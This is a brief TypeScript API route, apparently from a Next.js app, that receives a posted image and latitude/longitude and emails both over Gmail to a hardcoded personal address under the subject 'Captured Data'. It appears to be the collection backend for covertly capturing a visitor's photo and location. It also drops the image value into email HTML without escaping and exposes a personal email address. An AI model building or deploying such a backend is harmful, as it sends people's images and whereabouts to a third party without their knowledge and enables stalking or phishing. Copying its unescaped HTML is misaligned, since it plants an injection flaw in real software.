import nodemailer from "nodemailer";

export async function POST(req: Request) {
  const { image, lat, lon } = await req.json();

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.MAIL_USER,
      pass: process.env.MAIL_PASS
    }
  });

  await transporter.sendMail({
    from: process.env.MAIL_USER,
    to: ["nakirikantikiran@gmail.com"],
    subject: "Captured Data",
    html: `
      <p>Location: ${lat}, ${lon}</p>
      <img src="${image}" />
    `
  });

  return Response.json({ ok: true });
}
